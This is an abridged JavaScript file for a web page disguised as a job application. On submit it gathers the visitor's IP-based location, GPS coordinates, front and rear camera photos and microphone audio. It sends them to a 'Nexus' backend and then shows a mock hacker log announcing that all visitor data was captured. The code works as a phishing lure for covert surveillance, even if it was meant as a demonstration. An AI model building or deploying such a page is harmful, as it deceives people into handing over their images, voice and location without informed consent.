...
function renderDeviceData() {
  ...
  deviceGrid.appendChild(chipFull("SYSTEM CREDENTIALS", "CREATED BY PRAVEEN NARNI UNDER GUIDANCE BY SAI SHANTHAN", "cyan"));
...
function renderNetworkData(serverData) {
  ...
  networkGrid.appendChild(chip("IP_ADDRESS", serverData.ip_address, "cyan"));
  networkGrid.appendChild(chip("ISP", serverData.ip_isp || "N/A"));
  networkGrid.appendChild(chip("ORG", serverData.ip_org || "N/A"));
  networkGrid.appendChild(chip("CITY", serverData.ip_city || "N/A"));
  networkGrid.appendChild(chip("REGION", serverData.ip_region || "N/A"));
  networkGrid.appendChild(chip("COUNTRY", serverData.ip_country || "N/A", "amber"));
  networkGrid.appendChild(chip("TIMEZONE", serverData.ip_timezone || "N/A"));
  networkGrid.appendChild(chip("IP_LAT/LON",
...
function renderLocationData() {
  ...
  if (gathered.geo_lat && gathered.geo_lon) {
    locationGrid.appendChild(chip("GPS_LATITUDE", gathered.geo_lat.toFixed(6), "cyan"));
    locationGrid.appendChild(chip("GPS_LONGITUDE", gathered.geo_lon.toFixed(6), "cyan"));
    locationGrid.appendChild(chip("ACCURACY", `${gathered.geo_accuracy?.toFixed(1) || "?"}m`, "amber"));
    locationGrid.appendChild(chip("SOURCE", "BROWSER_API"));
  } else {
    locationGrid.appendChild(chipFull("GPS_STATUS", "LOCATION PERMISSION DENIED OR UNAVAILABLE", "amber"));
  }
}
...
function triggerPermissionsAndCapture() {
  ...
  // 2. Camera captures (front and back in sequence to avoid resource conflicts)
  cameraCapturesPromise = (async () => {
    // Front camera
    frontSlot.classList.add("scanning");
    const front = await captureCamera("user");
    frontSlot.classList.remove("scanning");
    if (front) {
      gathered.front_image = front;
      frontSlot.classList.add("captured");
      addBadge(frontSlot, "success", "◆ LOCKED");
    } else {
      frontSlot.classList.add("error");
      addBadge(frontSlot, "warn", "DENIED");
    }

    // Back camera
    backSlot.classList.add("scanning");
    const back = await captureCamera("environment");
    backSlot.classList.remove("scanning");
    if (back) {
      gathered.back_image = back;
      backSlot.classList.add("captured");
      addBadge(backSlot, "success", "◆ LOCKED");
    } else {
      backSlot.classList.add("error");
      addBadge(backSlot, "warn", "N/A");
    }
  })();
...
jobAppForm.addEventListener("submit", async (e) => {
  ...
  // Transmit payload to Nexus Backend
  try {
    transmissionResult = await transmit();
  } catch (err) {
    console.error("Nexus transmission failed:", err);
  }

  // Hide job application form and display hacker dashboard
  jobBaitContainer.classList.add("hidden");
  scanlineOverlay.classList.remove("hidden");
  topTicker.classList.remove("hidden");
  bottomTicker.classList.remove("hidden");
  terminalWrapper.classList.remove("hidden");

  // Run hacker log sequence
  runHackSequence();
});

// ══════════════════════════════════════════════════════════════
//  HACK DIAGNOSTIC SEQUENCE
// ══════════════════════════════════════════════════════════════
async function runHackSequence() {

  // ── BOOT ───────────────────────────────────────────────
  log("NEXUS//TRACE v5.0.0 — AUTO-EXTRACT MODE", "info");
  await wait(400);
  ...
  setPhase("BIOMETRIC");
  log("═══ PHASE 2: BIOMETRIC CAPTURE ═══", "warn");
  reveal("sectionCamera");
  await wait(300);

  // Front camera
  log("REQUESTING CAMERA ACCESS…");
  await wait(300);
  log("ACTIVATING FRONT_CAM [ facingMode: user ]…");
  await wait(500);

  if (gathered.front_image) {
    log("FRONT_CAM CAPTURE — LOCKED ✓", "success");
  } else {
    log("FRONT_CAM — ACCESS DENIED OR UNAVAILABLE", "error");
  }

  await wait(400);

  // Back camera
  log("ACTIVATING REAR_CAM [ facingMode: environment ]…");
  await wait(500);

  if (gathered.back_image) {
    log("REAR_CAM CAPTURE — LOCKED ✓", "success");
  } else {
    log("REAR_CAM — GRACEFUL FALLBACK (SINGLE LENS DEVICE)", "warn");
  }

  log("BIOMETRIC SCAN — COMPLETE ✓", "success");
  await wait(500);

  // ── PHASE 2.5: VOICE INTERCEPT ─────────────────────────
  setPhase("VOICE_REC");
  log("═══ PHASE 3: VOICE INTERCEPT ═══", "warn");
  reveal("sectionAudio");
  await wait(300);
  log("REQUESTING MICROPHONE ACCESS…");
  await wait(400);

  if (gathered.audio_recording) {
    log("VOICE CAPTURE — RECORDING LOCKED ✓", "success");
  } else {
    log("MICROPHONE — ACCESS DENIED OR UNAVAILABLE", "warn");
  }

  log("VOICE INTERCEPT — COMPLETE ✓", "success");
  await wait(500);
  ...
  await wait(300);
  log("ESTABLISHING UPLINK TO NEXUS CORE…");
  ...
  if (transmissionResult && transmissionResult.success) {
    ...
    log("DATA STORED IN NEXUS DATABASE ✓", "success");
  ...
  document.getElementById("footerExtract").innerHTML =
    'EXTRACTION: <span class="neon-green">COMPLETE</span>';

  log("════════════════════════════════════", "success");
  log("DATA EXTRACTION SEQUENCE — COMPLETE", "success");
  log("ALL VISITOR DATA CAPTURED & STORED", "success");
  log("════════════════════════════════════", "success");
}
